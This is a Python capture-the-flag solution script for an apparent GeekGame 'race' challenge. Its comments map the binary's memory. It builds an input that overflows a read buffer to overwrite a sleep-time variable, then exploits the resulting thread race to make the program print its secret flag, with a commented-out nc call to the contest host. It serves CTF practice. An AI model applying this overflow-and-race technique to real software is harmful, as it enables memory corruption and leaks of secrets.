import subprocess
import sys

# 4060 --- p
# 4160 --- usleep_time
# 4180 --- flag_buf (secret)
# 41C0 --- output_buf
# 4200 --- buf
# 4230 --- size

# Call main:
# scanf -> size      # Must be 4
# read(0, &p, 0x104)

# Call do_output:
# check size <= 4
# check size > 0
# check strlen(flag_buf) <= 48
# sleep usleep_time

# Switch to get_thread2_input:
# scanf -> size
# check size <= 49
# memcpy buf p size
# print "input success!"

# Back to do_output:
# memcpy output_buf flag_buf size # size is 48
# puts output_buf                 # Leak flag

token = "256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H"
# token = ""

if True:
    st = b'!~'
    us = int.from_bytes(st, byteorder='little')
    print(us)
    assert us <= 10e6
    assert us > 5e6
    s = token.encode() + b'\n\n\n4\n' + b'x'*256 + st + b'\n' + \
        b'21\n'

    print(s)
    print(s.decode())

    with open('hack.txt', 'wb') as f:
        f.write(s)
else:
    s = token.encode() + b'\n\n\n4\nx\n4\n\n\n'
    print(s)
    print(s.decode())


# out, err = subprocess.Popen(["nc", "prob11.geekgame.pku.edu.cn", "10011"],
#                             stdin=subprocess.PIPE).communicate(input=s, timeout=10)

# out, err = subprocess.Popen(["./race"], stdin=subprocess.PIPE).communicate(input=s, timeout=10)

# print(out.decode())
# print(err.decode())

# child.stdin.write(s)
# child.stdin.close()
# child.wait()
